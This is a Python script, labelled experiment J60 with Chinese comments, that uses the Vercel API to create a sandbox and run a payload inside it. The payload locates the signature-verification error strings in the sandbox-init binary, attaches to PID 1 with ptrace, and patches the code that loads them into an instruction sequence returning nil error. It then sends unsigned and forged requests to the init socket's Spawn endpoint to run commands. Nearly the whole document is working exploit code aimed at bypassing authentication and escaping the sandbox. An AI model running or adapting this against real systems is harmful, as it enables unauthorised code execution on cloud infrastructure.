# 实验J60: patch "invalid signature" 引用点 -> 验证函数返回 nil error
# 策略: 把加载错误字符串的 lea 指令改成 xor eax,eax; xor edx,edx; ret (返回 nil)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj60"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, struct, subprocess, json, time, ctypes, base64

b = open("/run/vercel/share/sandbox-init", "rb").read()
TEXT_START = 0x400000
TEXT_FILE = 0x0  # text 段文件偏移

def va_to_file(va):
    # text 段: file 0 -> va 0x400000; rodata: file 0x4db000 -> va 0x8db000
    if 0x400000 <= va < 0x8db000:
        return va - 0x400000
    if 0x8db000 <= va < 0xe30000:
        return va - 0x400000
    if 0xe30000 <= va < 0xe9fc40:
        return va - 0x400000
    return None

def file_to_va(fo):
    if 0 <= fo < 0x4da871:
        return fo + 0x400000
    if 0x4db000 <= fo < 0x4db000 + 0x554cb8:
        return fo + 0x400000
    return None

print("===== [1] 找所有验证相关字符串引用 =====", flush=True)
strings_of_interest = [b"invalid signature", b"missing signature header",
                       b"missing timestamp header", b"missing required header"]
str_vars = {}
for s in strings_of_interest:
    i = b.find(s)
    str_vars[s] = i
    print("%r @ file %s va %s" % (s, hex(i), hex(i + 0x400000) if 0x8db000 <= i < 0xe30000 else "?"), flush=True)

def find_refs(str_va):
    """找所有 48 8d xx disp32 指向 str_va 的指令 (text 段)"""
    hits = []
    for m in re.finditer(rb"\x48\x8d[\x05\x0d\x15\x1d\x25\x2d\x35\x3d](.{4})", b):
        disp = struct.unpack("<i", m.group(1))[0]
        ins_va = m.start() + 0x400000
        tgt = ins_va + len(m.group(0)) + disp
        if tgt == str_va:
            hits.append((ins_va, m.start(), m.group(0)))
    return hits

refs = {}
for s, fo in str_vars.items():
    if fo is None:
        continue
    # text (file 0x0-0x4da871) 和 rodata (file 0x4db000-0xa2fcb8) 的 va 都是 fo+0x400000
    if (fo >= 0x0 and fo < 0x4da871) or (fo >= 0x4db000 and fo < 0xa2fcb8):
        sva = fo + 0x400000
    else:
        sva = None
    if sva:
        rs = find_refs(sva)
        refs[s] = rs
        print("%r refs: %s" % (s, [(hex(va), hex(fo2)) for va, fo2, _ in rs]), flush=True)

print("===== [2] dump 引用点上下文 (文件偏移) =====", flush=True)
for s, rs in refs.items():
    for va, fo, raw in rs[:4]:
        print("=== %r @ va %s (file %s) ===" % (s, hex(va), hex(fo)), flush=True)
        print("ins: %s" % raw.hex(), flush=True)
        print("prev: %s" % b[max(0, fo-64):fo].hex(), flush=True)
        print("next: %s" % b[fo+len(raw):fo+len(raw)+96].hex(), flush=True)

print("===== [3] 函数入口定位 (从引用点向前找序言) =====", flush=True)
# 对每个引用点, 向前最多 500 字节找函数入口特征
def find_prologue(fo):
    window = b[max(0, fo-700):fo]
    base = fo - len(window)
    candidates = []
    # 特征1: sub $imm, rsp  (48 83 ec xx)
    for m in re.finditer(rb"\x48\x83\xec[\x00-\x80]", window):
        candidates.append(base + m.start())
    # 特征2: TLS 加载 (64 48 8b 0c 25 f8 ff ff ff)
    for m in re.finditer(rb"\x64\x48\x8b\x0c\x25\xf8\xff\xff\xff", window):
        candidates.append(base + m.start())
    # 特征3: push rbp (55) 或 mov rbp (48 89 e5)
    for m in re.finditer(rb"\x55\x48\x89\xe5", window):
        candidates.append(base + m.start())
    # 特征4: 48 89 5c 24 xx (Go 常见)
    for m in re.finditer(rb"\x48\x89\x5c\x24\x08", window):
        candidates.append(base + m.start())
    return sorted(set(candidates))

for s, rs in refs.items():
    for va, fo, raw in rs[:4]:
        pros = find_prologue(fo)
        print("%r @ file %s prologue candidates: %s" % (s, hex(fo), [hex(p) for p in pros[-6:]]), flush=True)

print("===== [4] patch: lea 引用点 -> xor eax,eax; xor edx,edx; ret =====", flush=True)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long
libc.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
libc.waitpid.restype = ctypes.c_int

def ptrace_rw(addr, data=None, read_len=0):
    libc.ptrace(16, 1, None, None)
    wp = libc.waitpid(1, None, 0)
    if wp != 1:
        libc.ptrace(17, 1, None, None)
        return -1, "waitpid=%d" % wp
    if data is not None:
        PTRACE_POKEDATA = 5
        ok = 0
        total = (len(data) + 7) // 8
        for off in range(0, len(data), 8):
            word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
            r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
            if r == 0:
                ok += 1
        libc.ptrace(17, 1, None, None)
        return ok, total
    else:
        PTRACE_PEEKDATA = 4
        out = b""
        off = 0
        while off < read_len:
            v = libc.ptrace(PTRACE_PEEKDATA, 1, addr + off, None)
            if v == -1:
                break
            out += (v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
            off += 8
        libc.ptrace(17, 1, None, None)
        return len(out), out

PATCH = b"\x31\xc0\x31\xd2\xc3"  # xor eax,eax; xor edx,edx; ret
patched = []
for s, rs in refs.items():
    for va, fo, raw in rs[:4]:
        ok, total = ptrace_rw(va, data=PATCH)
        print("PATCH %r @ va %s: %d/%d" % (s, hex(va), ok, total), flush=True)
        if ok == total:
            patched.append(va)

print("===== [5] 测试 =====", flush=True)
def ccall(path, body, hdrs, timeout=10):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: application/connect+json",
           "-H", "Connect-Protocol-Version: 1"]
    for k, v in hdrs.items():
        cmd += ["-H", "%s: %s" % (k, v)]
    cmd += ["-d", body, "http://localhost" + path]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return r.stdout
    except Exception as e:
        return "EXC " + str(e)

ts = str(int(time.time() * 1000))
for label, hdrs in [
    ("no-sig", {}),
    ("random-sig", {"x-timestamp": ts, "x-signature": base64.b64encode(b"\x99" * 64).decode()}),
    ("empty-ts", {"x-signature": base64.b64encode(b"\x99" * 64).decode()}),
]:
    out = ccall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", '{"command":"id"}', hdrs)
    print("[%s] %s" % (label, out[:900].replace("\r\n", " | ")), flush=True)
'''
run_cmd(sid, SCAN, "patch-invalid-sig-ref", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
